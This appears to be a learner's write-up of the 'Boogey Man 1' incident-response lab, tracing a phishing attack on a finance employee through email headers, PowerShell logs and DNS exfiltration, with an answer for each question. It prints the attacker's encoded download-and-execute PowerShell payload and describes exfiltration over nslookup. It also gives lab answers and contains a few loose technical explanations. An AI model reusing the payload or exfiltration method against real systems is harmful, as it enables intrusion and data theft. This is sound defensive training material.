Boogey Man 1  

Julianna, a finance employee working for Quick LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc.  However, not knowing that the email was sent by an attacker, she opened the malicious attachment and them her workstation was compromised.  

The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group Boogeyman, known for targeting the logistics sector.  

Email Analysis 

Questions 

1. What is the email address used to send the phishing email?  
- Opening up the dump.eml, and accessing thunderbird, we can observe the sender of the email.  
    
	![[328.png]]
	Answer: agriffin@bpakcaging.xyz 

2. What is the email address of the victim?  
	Answer: julianne.westcott@hotmail.com 
- We can see the receiver email in the screenshot above.  
    
3. What is the name of the third-party mail relay service by the attacker based on the DKIM-Signature and List-Unsubscribe headers?  
- DKIM- Signature: DKIM (Domain Keys Identified Mail Signature) is a cryptographic signature added to an email header.  
- We can observe the DKIM in the terminal using “cat” to read the file and “grep” to grab the specifics we are looking for.  
    
	![[329.png]]
	Answer: elasticmail 

4. What is the name of the file inside the encrypted attachment?  
- First, we need to save the file to the Linux machine and unzip the file.  
    
	![[330.png]]
	 

- We can then us the command “unzip” to unzip the file  
    
	![[331.png]]
- It is asking for a password.  

- In the email, there was a code sent the Julianne to access the attachment shown below. 
    
	![[332.png]]
	![[333.png]]
	Answer:  Invoice_20230103.lnk 

5. What is the password of the encrypted attachment?  
    

Answer: Invoice_2023! 

- We discovered this in question 4.  
6. Based on the results of the Inkparse tool, what is the encoded payload found in the Command Line Argument field?  
- To discover the encoded payload, we can “cat” the unzip attachment and observe the command line.  
- Usually, when a payload is encrypted in a command line, the attacker uses base64 encryption  
    
	![[334.png]]
	Answer: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA== 

Endpoint Security 
- We can see that Julianne machine was compromised from a PowerShell execution. 
- Decoding the payload reveals the astarting point of the endpoint activites.  
    

JQ command 

- Is a lightweight and flexible command-line JSON processor. This tool can be used in conjunction with other text-processing commands 
    

|   |   |
|---|---|
|Parse all JSON into beautified output|cat powershell.json \| jq|
|Print all values from a specific field without printing the field|cat powershell.json \| jq '.Field1'|
|Print all values from a specific field|cat powershell.json \| jq '{Field1}'|
|Print values from multiple fields|cat powershell.json \| jq '{Field1, Field2}'|
|Sort logs based on their Timestamp|cat powershell.json \| jq -s -c 'sort_by(.Timestamp) \| .[]'|
|Sort logs based on their Timestamp and print multiple field values|cat powershell.json \| jq -s -c 'sort_by(.Timestamp) \| .[] \| {Field}'|

Questions 

1. What are the domains used by the attacker for file hosting and C2?  
- Going back to the email, we can assume one of  the domains is bpakcaging.xyz 
- We can grep for bpakcaging or we can grep the domian type (xyz) 
    

Method 1: cat powershell.json | jq | grep bpakcaging 

![[335.png]] 

Method 2: cat powershell.json | jg | grep .xyz 
	![[336.png]]
	Answer: cdn.bpakcaging.xyz, files.bpakcaging.xyz 

2. What is the enumeration tool downloaded by the attacker?  
- Since a tool was downloaded, http/https protocpl was used to get the tool from some website.  
    
	![[337.png]]
	Answer: Seatbelt  

Seatbelt 

- Performs a number of security-oriented host surveys relevant from both offensive and defensive security perspectives. 
- Design to gather a wide range of system information, including running processes, service scheduled-task, use privileges, install software, etc.  
[GhostPack/Seatbelt: Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt) 

3. What is the file access by the attacker using the downloaded sq3.exe binary?  Provide the full file path with escape backslashes.  
    

- Let filter the sq3.exe in the terminal to see what we will get.  
    
	![[338.png]] 

- We can see that the tool was executed within the Music\\ AppData\\Local path directory, but we need the full path of the sq3 executable.  
    

- Since we know that the machine is owned to user Julianne Westcott and is a Windows machine, we can grep for either westcott or Users to pull up the start of the path.  
    
	![[339.png]]

	Answer: C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite 

4. What is the software that uses the file in Q3? 
	Answer: Microsoft Stick Notes
- We obtain this from the path in question 3.  
    

5. What is the name of the exfiltrated file? 
	Answer: protected_data.kdbx  

- We obtained the answer from the screen shot above since the attacker was using discovery commands within the machine and was reading the file as well sending it back to the destination IP 167.71.211.113 
    
6. What type of file uses the .kdbx file extension?  
    

Answer: Keepass 

- .kdbx file extension is associated with KeePass, a password management application that securely stores user credentials in an encrypted database.  
- [KDBX File - What is a .kdbx file and how do I open it?](https://fileinfo.com/extension/kdbx) 
- This question required external search  

7. What is the encoding used during the exfiltration attempt of the sensitive file? 
- Going back to the domain “bpakcaging” we can see the encrypted type shown below: 
    
	![[340.png]]
	Answer: hex 

8. What is the tool used for exfiltration?  
	Answer: nslookup 

Nslookup (Name Server Lookup) 

- Is a network administration command-line tool used for querying the Domain Name System (DNS) to obtain domain name or IP address mapping or other DNS records.  
[DNS Lookup Tool – Check DNS Records and Nameservers](https://www.nslookup.io/) 

Network Traffic Analysis 

- The threat actor was able to read and exfiltrate two potentially sensitve files 
- The domain and port used for the network activity were discovered including the tool used by the threat actor for exfiltration.  
    

Questions:  

1. What software is used by the attacker to host its presumed file/payload server?  
- We can find this through wire shark. 
- Since we know the ip address of the attacker, we can filter using http.response && ip.src 167.71.211.113 
    
	![[341.png]]
	Answer: Python 

2. What HTTP method is used by the C2 for the output of the commands executed by the attacker?  
- The only HTTP method that performs out put is the POST method.  
- We can also filter in Wireshark the domain that we discovered as well to determine the method , if we not so sure.  
- We acan use http contain cdn.bpakcaging.xyz 
	![[342.png]] 

- We can see some POST method occuring.  
- Let filter for POST method to see if the attacker is continently using the method to obtain information from the targets machine.  
    
	![[343.png]]
	Answer: POST  

- The attacker to retrieve the information but hiding it in hexadecimal that way whatever they are receiving is not being read through the traffic.  

3. What is the protocol used during the exfiltration activity?  
- Looking back in the terminal when we grep for bpakcaging, we notice nslookup was used in the execution. nslookup is a queries DNS for information.  
- We can also use Wireshark to filter for dns activity associated with the domain files.bpakcaging.xyz 
    
	![[344.png]]
	Answer: dns  

4. What is the password of the exfiltrated activity?  
- The attacker was able to obtain records by using sq3.exe that accesses plum.sqlite.  
- By doing so, the attacker was able to retrieve sensitive information. 
- We can filter sq3.exe outputs shown below. 
    
	![[345.png]]
	 

- Next, we want to follow the tcp stream from the last results in time frame 1373.974419 
	
	![[346.png]]
	 
	![[347.png]]
	 

- Here we can see that plum.sqlite was used to store the information from the machine the attacker compromised.  
- We can continue the follow the TCP stream to see the next output or maybe a encrypted value that was used to store the information.  
- We are at stream 749 the next TCP stream should have encrypted outputs.  
    
	![[348.png]]
	 

- We can see there is a encrypted hexadecimal, let decode it to see what the attacker was able to retrieve from the targets machine.  
- WE can use Cyberchef to decode the hexadecimal, and to decode this we will have to use “From Decimal” tp properly decode the hexadecimal  
    
	![[349.png]]
	Answer: %p9^3!lL^Mz47E2GaT^y 

5. What is the credit card number stored inside the exfiltrated file?  
- To figure the credit card number, we will have to use T-shark.  
- TShark: is a command line based for Wireshark to use in a terminal. 
- The command we will used is shown below: 
- tshark -r capture.pcapng  -Y 'dns' -T fields -e dns.qry.name |grep ".bpakcaging.xyz" 
- Tshark –r <-- reads the capture.pcap file 
- -Y ‘dns’ <-- Applies a display filter to only process packets that used DNS protocol  
- -T fields <-- Sets the output format to fields, that allows tshark to extract specific pieces of data  
- -e dns.qry.nmae <--- this is requesting to pulled the reults from the filter  “dny.qry.name 
- | grep .bpakcaging.xyz” -- Searches the list of the extracted domain names and only show strings that are associated with .bpakcaging.xyz 
    
	![[350.png]]
	 

- This pull information that is not needed, so we need to filter the unnecessary info out and remove the empty spaces   
- tshark -r capture.pcapng  -Y 'dns' -T fields -e dns.qry.name |grep ".bpakcaging.xyz" | cut -f1 -d '.'|grep -v -e "files" -e "cdn" | uniq | tr -d '\\n' 
- cut –f1 –d ‘.’ <--- this isolates the subdomain part of the query(.bpakcaging.xyz) 
- grep –v  -e “files” 0e “cdn” <---  -v performs an inverse search that remove lines that contains “files” or “cdn” 
- tr –d ‘\n’ <--- this seletes all newline characters and join all the individual subdomain together into one single string.  
    
	![[351.png]]
	 

- Now that we clean up the encrypted values that were split, we can use cyber chef to decode the encrypted values.  
- We can save the file with the .kdbx extension  
- After we save the file we will then open he terminal and use keepass2 to the cc.kdbx file.  
    
	![[352.png]]
	 

- Here we will use the password we discovered (%p9^3!lL^Mz47E2GaT^y) 
    
	![[353.png]]
	Answer: 4024007128269551